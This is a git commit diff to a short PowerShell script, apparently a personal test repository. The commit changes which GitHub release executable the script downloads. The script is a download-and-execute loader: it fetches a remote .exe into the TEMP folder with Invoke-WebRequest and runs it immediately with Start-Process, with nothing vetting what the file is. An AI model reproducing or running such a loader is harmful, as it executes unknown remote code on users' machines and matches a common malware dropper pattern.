28c3202ed4c2340cdf53ba21ab862f86c1486004
mirapuedovolar2 <cuentaparametasimon@gmail.com>
2025-04-24 10:36:46 -0400

    Update prueba2.ps1

--- prueba2.ps1
+++ prueba2.ps1
@@ -1,5 +1,5 @@
 $destino = "env:TEMP\codigo2.exe"
-$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebas/codigo2.exe"
+$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebahola/oconsole.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $destino
 Start-Process -FilePath $destino
